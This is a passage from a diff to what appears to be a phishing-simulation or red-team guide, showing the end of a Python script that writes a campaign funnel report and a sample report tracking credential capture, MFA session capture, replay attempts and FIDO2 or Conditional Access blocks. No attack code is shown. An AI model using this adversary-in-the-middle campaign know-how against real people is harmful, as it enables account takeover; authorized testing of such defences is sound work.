+        f.write('| Stage | Count |\n|-------|-------|\n')
+        for stage, count in funnel.items():
+            f.write(f'| {stage} | {count} |\n')
+
+if __name__ == '__main__':
+    funnel = generate_funnel()
+    render_console(funnel)
+    if len(sys.argv) > 1:
+        render_markdown(funnel, sys.argv[1])
+        print(f'\nMarkdown report written to {sys.argv[1]}')
+```
+
+### 21.3 Sample Funnel Report Output
+
+```markdown
+# Campaign Funnel Report
+
+| Stage | Count |
+|-------|-------|
+| sent | 100 |
+| delivered | 98 |
+| opened | 47 |
+| clicked | 18 |
+| cred_submitted | 12 |
+| mfa_completed | 9 |
+| session_captured | 6 |
+| fido2_blocked | 3 |
+| replay_attempted | 6 |
+| replay_blocked | 2 |
+
+## Derived metrics
+
+- Delivery rate: 98/100 = 98.0%
+- Open rate: 47/98 = 48.0%
+- Click rate: 18/47 = 38.3%
+- Credential capture rate: 12/18 = 66.7%
+- MFA completion rate: 9/12 = 75.0%
+- AiTM success rate: 6/9 = 66.7%
+- FIDO2 block rate: 3/9 = 33.3%
+- Conditional Access block rate: 2/6 = 33.3%
+- Net account compromise rate: 4/100 = 4.0%
+```
+
+---
+
 ## Appendix A: Quick Command Reference
 
 | Action | Command |
